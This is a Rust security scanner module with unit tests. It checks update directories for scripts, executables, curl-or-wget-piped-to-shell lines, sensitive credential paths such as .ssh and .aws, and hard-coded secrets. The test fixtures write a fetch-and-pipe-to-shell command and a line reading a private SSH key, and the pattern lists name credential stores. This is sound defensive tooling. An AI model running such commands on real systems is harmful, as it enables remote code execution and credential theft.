use crate::findings::{SecurityFinding, SecuritySeverity};
use serde::{Deserialize, Serialize};
use std::fs;
use std::path::{Component, Path};
use walkdir::WalkDir;

#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct SecurityReport {
    pub findings: Vec<SecurityFinding>,
}

#[derive(Debug, thiserror::Error)]
pub enum SecurityCheckError {
    #[error("io error: {0}")]
    Io(#[from] std::io::Error),

    #[error("walkdir error: {0}")]
    WalkDir(#[from] walkdir::Error),

    #[error("path is not under root: {path}")]
    StripPrefix { path: String },
}

pub fn scan_directory(root: impl AsRef<Path>) -> Result<SecurityReport, SecurityCheckError> {
    let root = root.as_ref();
    let mut findings = Vec::new();

    for entry in WalkDir::new(root).follow_links(false) {
        let entry = entry?;
        let path = entry.path();

        if is_in_git_dir(path) || !entry.file_type().is_file() {
            continue;
        }

        let relative_path = path
            .strip_prefix(root)
            .map_err(|_| SecurityCheckError::StripPrefix {
                path: path.to_string_lossy().to_string(),
            })?
            .components()
            .map(component_to_string)
            .collect::<Vec<_>>()
            .join("/");
        let metadata = entry.metadata()?;

        if is_script_file(&relative_path) {
            findings.push(finding(
                SecuritySeverity::Info,
                "script-file",
                "Script file included in update",
                &relative_path,
                None,
            ));
        }

        if is_executable(&metadata) {
            findings.push(finding(
                SecuritySeverity::Info,
                "executable-file",
                "Executable file included in update",
                &relative_path,
                None,
            ));
        }

        let Ok(contents) = fs::read_to_string(path) else {
            continue;
        };
        scan_file_contents(&relative_path, &contents, &mut findings);
    }

    findings.sort_by(|left, right| {
        left.relative_path
            .cmp(&right.relative_path)
            .then(left.line.cmp(&right.line))
            .then(left.rule_id.cmp(&right.rule_id))
    });

    Ok(SecurityReport { findings })
}

fn scan_file_contents(relative_path: &str, contents: &str, findings: &mut Vec<SecurityFinding>) {
    for (index, line) in contents.lines().enumerate() {
        let line_number = Some((index + 1) as u32);
        let normalized = line.to_ascii_lowercase();

        if contains_network_exec(&normalized) {
            findings.push(finding(
                SecuritySeverity::Warning,
                "network-exec",
                "Script downloads content and passes it to a shell",
                relative_path,
                line_number,
            ));
        }

        if contains_sensitive_path(&normalized) {
            findings.push(finding(
                SecuritySeverity::Warning,
                "sensitive-path",
                "Access to sensitive local path or credential store",
                relative_path,
                line_number,
            ));
        }

        if contains_secret_literal(&normalized) {
            findings.push(finding(
                SecuritySeverity::Warning,
                "secret-literal",
                "Configuration field contains a secret-looking value",
                relative_path,
                line_number,
            ));
        }
    }
}

fn contains_network_exec(line: &str) -> bool {
    (line.contains("curl ") || line.contains("wget ")) && line.contains('|') && line.contains("sh")
}

fn contains_sensitive_path(line: &str) -> bool {
    [".ssh", "id_rsa", "keychain", "/etc/", ".aws", ".config/gh"]
        .iter()
        .any(|pattern| line.contains(pattern))
}

fn contains_secret_literal(line: &str) -> bool {
    let has_secret_key = ["token", "secret", "api_key", "apikey", "private_key"]
        .iter()
        .any(|keyword| line.contains(keyword));
    let has_assignment = line.contains('=') || line.contains(':');
    if line.contains("-----begin") && line.contains("private key") {
        return true;
    }
    if !has_secret_key || !has_assignment {
        return false;
    }
    let Some((_, value)) = line.split_once('=').or_else(|| line.split_once(':')) else {
        return false;
    };
    let normalized_value = value
        .trim()
        .trim_matches(|character| character == '"' || character == '\'' || character == '`');
    if normalized_value.len() < 24 {
        return false;
    }
    ![
        "$",
        "${",
        "{{",
        "env.",
        "env(",
        "process.env",
        "your_",
        "example",
        "placeholder",
        "<",
    ]
    .iter()
    .any(|pattern| normalized_value.contains(pattern))
}

fn finding(
    severity: SecuritySeverity,
    rule_id: &str,
    message: &str,
    relative_path: &str,
    line: Option<u32>,
) -> SecurityFinding {
    SecurityFinding {
        severity,
        rule_id: rule_id.to_string(),
        message: message.to_string(),
        relative_path: relative_path.to_string(),
        line,
    }
}

fn is_script_file(relative_path: &str) -> bool {
    [".sh", ".bash", ".zsh", ".ps1", ".py", ".js", ".ts"]
        .iter()
        .any(|suffix| relative_path.ends_with(suffix))
}

fn is_in_git_dir(path: &Path) -> bool {
    path.components()
        .any(|component| component == Component::Normal(".git".as_ref()))
}

fn component_to_string(component: Component<'_>) -> String {
    component.as_os_str().to_string_lossy().to_string()
}

#[cfg(unix)]
fn is_executable(metadata: &fs::Metadata) -> bool {
    use std::os::unix::fs::PermissionsExt;

    metadata.permissions().mode() & 0o111 != 0
}

#[cfg(not(unix))]
fn is_executable(_metadata: &fs::Metadata) -> bool {
    false
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::findings::{SecurityFinding, SecuritySeverity};
    use std::fs;
    use std::path::{Path, PathBuf};
    use std::time::{SystemTime, UNIX_EPOCH};

    fn temp_dir(name: &str) -> PathBuf {
        let suffix = SystemTime::now()
            .duration_since(UNIX_EPOCH)
            .expect("system time should be after unix epoch")
            .as_nanos();
        let root = std::env::temp_dir().join(format!("metis-security-{}-{}", name, suffix));
        fs::create_dir_all(&root).expect("temp directory should be created");
        root
    }

    fn write_file(path: &Path, contents: &str) {
        if let Some(parent) = path.parent() {
            fs::create_dir_all(parent).expect("parent directory should be created");
        }
        fs::write(path, contents).expect("test file should be writable");
    }

    fn assert_finding(
        findings: &[SecurityFinding],
        rule_id: &str,
        relative_path: &str,
        severity: SecuritySeverity,
        line: Option<u32>,
    ) {
        let finding = findings
            .iter()
            .find(|finding| finding.rule_id == rule_id && finding.relative_path == relative_path)
            .unwrap_or_else(|| panic!("expected finding {rule_id} for {relative_path}"));
        assert_eq!(finding.severity, severity);
        assert_eq!(finding.line, line);
    }

    #[test]
    fn scan_directory_reports_attention_items_without_alarmist_severity() {
        let root = temp_dir("rules");
        write_file(
            &root.join("install.sh"),
            "curl https://example.com/install.sh | sh\ncat ~/.ssh/id_rsa\n",
        );
        write_file(&root.join("SKILL.md"), "token = \"${METIS_TOKEN}\"\n");
        let fake_secret = ["sk", "1234567890abcdef1234567890abcdef"].join("-");
        write_file(
            &root.join("config.env"),
            &format!("api_key = \"{fake_secret}\"\n"),
        );

        let report = scan_directory(&root).expect("security scan should succeed");
        fs::remove_dir_all(&root).expect("temp directory should be removed");

        assert_finding(
            &report.findings,
            "script-file",
            "install.sh",
            SecuritySeverity::Info,
            None,
        );
        assert_finding(
            &report.findings,
            "network-exec",
            "install.sh",
            SecuritySeverity::Warning,
            Some(1),
        );
        assert_finding(
            &report.findings,
            "sensitive-path",
            "install.sh",
            SecuritySeverity::Warning,
            Some(2),
        );
        assert_finding(
            &report.findings,
            "secret-literal",
            "config.env",
            SecuritySeverity::Warning,
            Some(1),
        );
        assert!(
            !report
                .findings
                .iter()
                .any(|finding| finding.rule_id == "secret-literal"
                    && finding.relative_path == "SKILL.md"),
            "placeholder token fields should not be reported as hard-coded secrets"
        );
    }

    #[test]
    fn scan_directory_does_not_flag_plain_network_downloads() {
        let root = temp_dir("plain-curl");
        write_file(
            &root.join("README.md"),
            "Fetch docs with curl https://example.com/SKILL.md\n",
        );

        let report = scan_directory(&root).expect("security scan should succeed");
        fs::remove_dir_all(&root).expect("temp directory should be removed");

        assert!(
            report.findings.is_empty(),
            "plain curl mentions without shell execution should not create scary findings"
        );
    }

    #[test]
    fn scan_directory_skips_git_directory() {
        let root = temp_dir("skip-git");
        write_file(
            &root.join(".git/hooks/post-checkout"),
            "curl https://example.com | sh\n",
        );

        let report = scan_directory(&root).expect("security scan should succeed");
        fs::remove_dir_all(&root).expect("temp directory should be removed");

        assert!(report.findings.is_empty());
    }

    #[cfg(unix)]
    #[test]
    fn scan_directory_reports_executable_files() {
        use std::os::unix::fs::PermissionsExt;

        let root = temp_dir("executable");
        let tool_path = root.join("bin/tool");
        write_file(&tool_path, "binary-ish");
        let mut permissions = fs::metadata(&tool_path)
            .expect("tool metadata should exist")
            .permissions();
        permissions.set_mode(0o755);
        fs::set_permissions(&tool_path, permissions).expect("tool should become executable");

        let report = scan_directory(&root).expect("security scan should succeed");
        fs::remove_dir_all(&root).expect("temp directory should be removed");

        assert_finding(
            &report.findings,
            "executable-file",
            "bin/tool",
            SecuritySeverity::Info,
            None,
        );
    }
}
